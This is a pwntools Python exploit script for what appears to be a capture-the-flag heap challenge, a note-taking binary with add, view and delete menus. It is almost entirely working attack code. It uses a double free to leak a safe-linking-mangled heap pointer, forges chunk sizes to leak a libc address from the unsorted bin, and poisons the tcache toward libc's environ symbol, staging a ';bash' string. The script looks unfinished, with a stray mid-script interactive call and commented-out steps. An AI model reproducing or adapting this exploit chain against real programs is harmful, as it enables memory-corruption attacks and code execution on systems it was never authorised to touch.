from pwn import *

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./a.out')
libc = elf.libc

p = elf.process()
s = ""
gdb.attach(p, gdbscript=s)

def demangle(val, is_heap_base=False):
    if not is_heap_base: 
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def add(index, title, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"index: ", str(index).encode())
    p.sendlineafter(b"title: ", title)
    p.sendlineafter(b"content: ", content)
    
def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", str(idx).encode())

def view(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", str(idx).encode())
    return p.recvuntil(b"\ncontent:")[:-len(b"\ncontent:")][len(b'title: '):]

for i in range(20):
    add(i, str(i).encode(), str(i).encode())

for i in range(10, 18):
    delete(i)

delete(18)
delete(19)
delete(18)

heap = demangle(unpack(view(18),'all'))
log.info(f"heap: {hex(heap)}")

p.interactive()

for i in range(3, 9):
    add(i, str(i).encode(), str(i).encode())
add(9, b"krgtw", p64(0) + p64(0x81) + p64(mangle(heap, 0)))


add(0, p64(mangle(heap, heap+0x3d0)), b"0")
add(0, b"awikwok", b"awikwok")
add(0, b"hehehe", b"hehehe")
add(0, p64(0) * 9 + p64(0x481)[:-1], b"lll")

for i in range(5):
    add(1, str(i).encode(), str(i).encode())

#delete(9)
#add(9, p64(0) * 6 +  p64(mangle(heap, heap+0x300)), b'asdoaskd')


delete(8)


libc.address = unpack(view(8),'all') - 0x21ace0
log.info(f"libc: {hex(libc.address)}")

for i in range(10):
    add(i, str(i).encode(), str(i).encode())

for i in range(7):
    delete(i)

delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i, str(i).encode(), str(i).encode())

add(8, p64(mangle(heap, libc.sym.environ)), b'wwwwww')
add(0, b";bash", b"awikwok")
add(0, b"hehehe", b"hehehe")

add(0, b'\A', b'\A')

p.interactive()
